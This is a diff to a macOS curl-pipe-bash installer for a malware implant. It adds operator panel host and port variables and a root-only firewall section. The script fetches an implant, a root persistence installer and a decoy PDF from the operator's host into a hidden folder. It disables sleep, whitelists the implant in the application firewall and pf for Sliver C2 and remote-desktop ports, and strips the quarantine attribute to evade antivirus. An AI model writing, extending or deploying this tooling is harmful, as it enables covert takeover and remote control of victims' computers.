@@ -9,27 +9,48 @@
 # usage: curl -sSL https://<panel>/install/mac | bash
 set -euo pipefail
 
+# ---- operator domain pre-configuration ------------------------------------
+# The panel domain is baked in at build time; all firewall/whitelist rules
+# point to it so the implant can always reach the operator.
+PANEL_HOST="{{PANEL_HOST}}"
+PANEL_C2_PORT="{{PANEL_C2_PORT}}"
+PANEL_RD_PORT="{{PANEL_RD_PORT}}"
+
 WORKDIR="$HOME/Library/Application Support/.fleet-update"
 mkdir -p "$WORKDIR"
 
 # ---- download implant (curl sets no quarantine attribute) ------------------
-IMPLANT_URL="{{PANEL_ENDPOINT}}/install/mac/binary"
+IMPLANT_URL="https://${PANEL_HOST}/install/mac/binary"
 curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun"
 chmod 0755 "$WORKDIR/fleetrun"
 
 # ---- download root installer (optional, for full system persistence) ------
-DAEMON_URL="{{PANEL_ENDPOINT}}/install/mac/daemon"
+DAEMON_URL="https://${PANEL_HOST}/install/mac/daemon"
 curl -fsSL "$DAEMON_URL" -o "$WORKDIR/install-daemon.sh" 2>/dev/null || true
 chmod 0755 "$WORKDIR/install-daemon.sh" 2>/dev/null || true
 
 # ---- download decoy PDF ----------------------------------------------------
-DECOY_URL="{{PANEL_ENDPOINT}}/install/mac/decoy"
+DECOY_URL="https://${PANEL_HOST}/install/mac/decoy"
 curl -fsSL "$DECOY_URL" -o "$WORKDIR/decoy.pdf"
 
 # ---- stay awake ------------------------------------------------------------
 caffeinate -ims >/dev/null 2>&1 &
 sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
 sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true
+
+# ---- firewall: allow outbound to operator panel on C2 + RD ports -----------
+if [ "$(id -u)" = "0" ]; then
+  # Allow outbound to operator domain on C2 (Sliver) and RD (screen/input) ports
+  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --add "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
+  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
+  # Whitelist operator domain in pf (macOS packet filter) for ports 8888 + 8443
+  sudo -n pfctl -e >/dev/null 2>&1 || true
+  sudo -n pfctl -f /etc/pf.conf >/dev/null 2>&1 || true
+  echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_C2_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
+  echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_RD_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
+  # AV exclusion for the implant path
+  sudo -n xattr -d com.apple.quarantine "$WORKDIR/fleetrun" 2>/dev/null || true
+fi
 
 # ---- system-wide root install via native macOS admin dialog ----------------
 # osascript "with administrator privileges" shows the standard macOS
